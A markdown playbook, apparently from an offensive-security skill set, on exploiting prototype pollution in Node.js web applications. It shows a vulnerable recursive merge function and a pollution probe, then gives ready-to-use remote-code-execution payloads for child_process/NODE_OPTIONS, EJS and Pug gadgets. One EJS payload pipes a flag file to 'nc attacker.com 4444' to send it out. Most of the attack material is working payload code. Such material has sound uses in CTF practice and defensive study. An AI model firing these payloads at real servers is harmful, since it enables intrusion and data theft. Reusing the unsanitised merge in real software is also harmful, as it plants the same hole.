# Node.js Prototype Pollution Playbook (skills/web/prototype-pollution.md)

## 1. Signatures & Code Patterns

Occurs when user-controlled JSON / object properties are merged recursively without key sanitization:
- **Vulnerable Functions**: `lodash.merge`, `lodash.defaultsDeep`, custom recursive `clone()` / `extend()` / `merge()`, query string parser with `__proto__` or `constructor.prototype`.

```javascript
// Vulnerable recursive merge pattern
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key]; // Dangerous if key === '__proto__'
        }
    }
}
```

---

## 2. Decision Flowchart & Gadget Triage

1. **Verify Pollution Probe**: Send `{"__proto__": {"polluted": true}}` $\rightarrow$ Check if other endpoints reflect `polluted`.
2. **Select Server-Side Gadget**:
   - **`child_process.fork()` / `spawn()`**: Overwrite `shell`, `execArgv`, or `env.NODE_OPTIONS`.
   - **Template Engines**:
     - *EJS*: Overwrite `outputFunctionName` or `client`.
     - *Pug / Jade*: Overwrite `block.type` or `plugins`.
     - *Handlebars*: Overwrite `compiler.compile`.
3. **Trigger Execution**: Call endpoint that spawns a process or renders a template.

---

## 3. High-Impact RCE Gadgets

### 3.1 `child_process` & `NODE_OPTIONS` Gadget
```json
{
  "__proto__": {
    "shell": "/bin/sh",
    "NODE_OPTIONS": "--require /proc/self/cmdline",
    "execArgv": [
      "--eval=require('child_process').execSync('cat /flag > /tmp/flag')"
    ]
  }
}
```

### 3.2 EJS Template Engine Gadget
```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag | nc attacker.com 4444');s"
  }
}
```

### 3.3 Pug / Jade Template Gadget
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('cat /flag')"
    }
  }
}
```
